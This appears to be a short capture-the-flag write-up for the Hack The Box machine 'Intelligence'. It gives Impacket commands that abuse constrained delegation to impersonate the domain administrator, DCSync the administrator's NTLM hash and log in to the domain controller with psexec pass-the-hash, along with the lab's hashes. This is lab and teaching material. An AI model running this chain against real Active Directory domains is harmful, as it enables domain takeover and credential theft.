# Intelligence - Constrained Delegation

## LINUX

Reference: https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/

svc_int$ has Constrained Delegation Privileges to request admin ticket to DC.

**1. Find user-based constrained delegation with protocol transition (svc_int$ to WWW/DC.intelligence.local)**

```bash
impacket-findDelegation intelligence.htb/svc_int$ -hashes :b8159389d3528c4b1079ae461f28eb69 -dc-ip 10.10.10.248
```

**2. Using svc_int$ credentials, obtain a service ticket as domain administrator to DC01 (S4U2Self + S4U2Proxy)**

```bash
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator 'intelligence.htb/svc_int$' -hashes :b8159389d3528c4b1079ae461f28eb69 -dc-ip 10.10.10.248
```

**3. Export the ticket into memory**

```bash
export KRB5CCNAME=./administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

**4. Perform a DCSync against DC as administrator**

```bash
impacket-secretsdump -k DC.intelligence.htb -just-dc-ntlm -just-dc-user administrator
```

**Finally access the DC as administrator**

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3 administrator@10.10.10.248
```
